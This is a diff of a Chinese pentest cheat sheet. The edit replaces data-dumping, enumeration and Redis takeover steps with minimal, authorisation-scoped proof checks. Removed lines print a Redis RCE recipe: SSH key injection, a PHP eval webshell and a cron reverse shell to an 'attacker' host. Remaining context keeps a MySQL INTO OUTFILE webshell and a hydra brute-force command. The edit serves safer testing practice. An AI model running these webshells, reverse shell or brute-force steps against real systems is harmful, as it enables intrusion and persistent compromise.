@@ -83,12 +83,12 @@ fofa "ip=\"target\""
 
 ```bash
 # Redis 未授权
-redis-cli -h target ping        # 返回 PONG → 未授权
+redis-cli -h target ping        # PONG 仅证明可达/允许 ping，不证明敏感命令未授权
 redis-cli -h target info        # 拉信息
 
 # Mongo
 mongo target:27017 --eval "db.adminCommand('listDatabases')"
-mongoexport -h target -d <db> -c <coll> -o out.json
+# Do not export collections; use an approved non-sensitive metadata probe.
 
 # ES
 curl -s http://target:9200/_cat/indices?v
@@ -100,7 +100,7 @@ curl -s http://target:2375/info
 
 # rsync
 rsync target::
-rsync -avz target::module ./local/
+# Do not mirror modules; confirm only approved metadata.
 
 # Memcached
 echo -e "stats\nquit" | nc target 11211
@@ -165,28 +165,9 @@ hydra -L users.txt -P pass.txt -t 4 -W 2 target http-post-form "/login:user=^USE
 
 ## 5. 利用提权 / 横向
 
-### 5.1 Redis 未授权 → RCE 三板斧
+### 5.1 Redis 未授权的最小证明
 
-```bash
-# 1. 写 SSH 公钥
-redis-cli -h target
-> config set dir /root/.ssh/
-> config set dbfilename authorized_keys
-> set x "\n\nssh-rsa AAAA...你的公钥...\n\n"
-> save
-
-# 2. 写 Webshell（需知道 web 根 + 写权限）
-> config set dir /var/www/html/
-> config set dbfilename shell.php
-> set x "<?php @eval($_POST['c']);?>"
-> save
-
-# 3. 计划任务反弹（Centos）
-> config set dir /var/spool/cron/
-> config set dbfilename root
-> set x "\n\n* * * * * bash -i >& /dev/tcp/attacker/4444 0>&1\n\n"
-> save
-```
+只验证明确批准的非敏感 `PING`/`INFO` 等能力并记录响应，区分网络可达与缺少鉴权。不得改 `dir`/`dbfilename`、写 SSH 密钥、webshell 或 cron；这些会改变状态并构成持久化，违反本工作流边界。影响可作为尚未验证的条件分析，不需要实际部署后门。
 
 ### 5.2 Tomcat / WebLogic / JBoss → 部署 WAR
 
@@ -215,13 +196,12 @@ SELECT '<?php @eval($_POST[c]);?>' INTO OUTFILE '/var/www/html/x.php';
 
 ```python
 import requests
-for i in range(1, 100000):
+for i in APPROVED_TEST_ACCOUNT_RESOURCE_IDS:  # explicit small allowlist
     r = requests.get(f"http://target/api/user/{i}", timeout=3)
     if r.status_code == 200:
         # 仅取 10 条样本即可证明，不要拖库
         print(i, r.text[:100])
-        if i > 10:
-            break
+        break  # stop after minimal proof; no enumeration of real users
 ```
 
 ---
